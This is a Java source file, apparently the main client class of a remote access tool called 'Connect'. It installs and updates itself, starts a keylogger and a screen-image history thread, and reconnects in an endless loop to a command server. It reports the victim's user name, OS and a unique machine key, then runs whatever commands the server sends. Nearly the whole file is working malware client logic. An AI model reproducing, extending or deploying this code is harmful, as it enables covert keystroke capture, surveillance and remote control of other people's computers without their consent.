package br.com.introcdc.connect.client;
/*
 * Written by IntroCDC, Bruno Coêlho at 13/01/2025 - 13:40
 */

import br.com.introcdc.connect.Connect;
import br.com.introcdc.connect.client.command.ClientCommand;
import br.com.introcdc.connect.client.command.ClientCommandEnum;
import br.com.introcdc.connect.client.components.*;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class ConnectClient {

    public static void main(String[] args) {
        startClient();
    }

    public static final ScheduledExecutorService EXECUTOR =
            Executors.newScheduledThreadPool(5);

    // Message Variables
    public static PrintWriter WRITER;
    public static boolean DEBUG = false;

    /**
     * Start Client
     */
    public static void startClient() {
        if (FileComponents.getFileName().equalsIgnoreCase("Uninstall.jar")) {
            InstallComponents.uninstall();
            return;
        }
        if (FileComponents.getFileName().equalsIgnoreCase(InstallComponents.LOCAL_UPDATER)) {
            InstallComponents.update();
            return;
        } else if (!FileComponents.getFileName().equalsIgnoreCase(InstallComponents.LOCAL_FILE) && InstallComponents.install()) {
            return;
        }
        FileComponents.deleteFile(new File(InstallComponents.LOCAL_UPDATER));
        ClientCommandEnum.registerCommands();
        new Thread(KeyLoggerComponents::startKeyLogger).start();
        new Thread(ControlComponents::startUpdater).start();
        new Thread(ImageComponents::startHistory).start();
        for (; ; ) {
            try {
                connectToServer();
                Thread.sleep(60 * 1000);
                System.gc();
            } catch (Exception ignored) {
            }
        }
    }

    /**
     * Send Message to Server
     */
    public static void msg(String message) {
        try {
            WRITER.println(message);
            WRITER.flush();
        } catch (Exception ignored) {
        }
    }

    /**
     * Send Exception to Server
     */
    public static void exception(Exception exception) {
        if (!DEBUG) {
            return;
        }

        msg(exception.toString());
        for (StackTraceElement element : exception.getStackTrace()) {
            msg("\tat " + element.toString());
        }
        Throwable cause = exception.getCause();
        while (cause != null) {
            msg("Caused by: " + cause);
            for (StackTraceElement element : cause.getStackTrace()) {
                msg("\tat " + element.toString());
            }
            cause = cause.getCause();
        }
    }

    public static void connectToServer() throws Exception {
        Socket socket = new Socket(Connect.IP, Connect.PORT);
        BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
        PrintWriter writer = new PrintWriter(socket.getOutputStream(), true);
        WRITER = writer;
        msg("key:" + InstallComponents.generateUniqueCode());
        msg("user:" + System.getProperty("user.name"));
        msg("date:" + FileComponents.toDate(new File(InstallComponents.LOCAL_FILE).lastModified()));
        msg("os:" + System.getProperty("os.name"));
        EXECUTOR.schedule(() -> {
            new Thread(ImageComponents::execHistoryUpdate).start();
            new Thread(ControlComponents::sendBasicInfo).start();
        }, 1, TimeUnit.SECONDS);

        try {
            String serverMessage;
            while ((serverMessage = reader.readLine()) != null) {
                ClientCommand.handleCommand(serverMessage);
            }
        } catch (Exception exception) {
            msg("Ocorreu um erro no processamento da mensagem do servidor (" + exception.getMessage() + ")");
            exception(exception);
        }
    }

}
